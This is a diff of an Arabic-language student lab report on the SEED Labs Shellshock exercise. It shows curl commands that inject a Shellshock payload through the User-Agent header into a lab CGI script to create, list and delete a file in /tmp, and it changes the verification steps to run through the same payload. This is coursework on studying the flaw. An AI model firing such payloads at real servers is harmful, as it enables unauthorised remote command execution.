@@ -132,11 +132,11 @@
 
 ### 3. Task 3.C: إنشاء ملف في مجلد `/tmp`
 - **الأمر:** `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/touch /tmp/shellshock_test.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
-- **التحقق:** استخدمنا الأمر `ls -l /tmp` من داخل الحاوية للتأكد من وجود الملف `shellshock_test.txt`.
+- **التحقق:** استخدمنا الأمر `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/ls -l /tmp" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`   للتأكد من وجود الملف `shellshock_test.txt`.
 
 ### 4. Task 3.D: حذف الملف المنشأ
 - **الأمر:** `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/rm /tmp/shellshock_test.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
-- **التحقق:** استخدمنا الأمر `ls -l /tmp` للتأكد من اختفاء الملف، مما يثبت نجاح أمر الحذف.
+- **التحقق:** استخدمنا الأمر `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/ls -l /tmp" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi` للتأكد من اختفاء الملف، مما يثبت نجاح أمر الحذف.
 
 ## الاستنتاج:
 تؤكد هذه التجارب قدرة المهاجم على تنفيذ أوامر برمجية متنوعة (قراءة صلاحيات، إنشاء ملفات، حذف ملفات) على النظام المستهدف بمجرد استغلال ثغرة Shellshock، مما يوضح التأثير الخطير لهذه الثغرة على أمن الأنظمة.
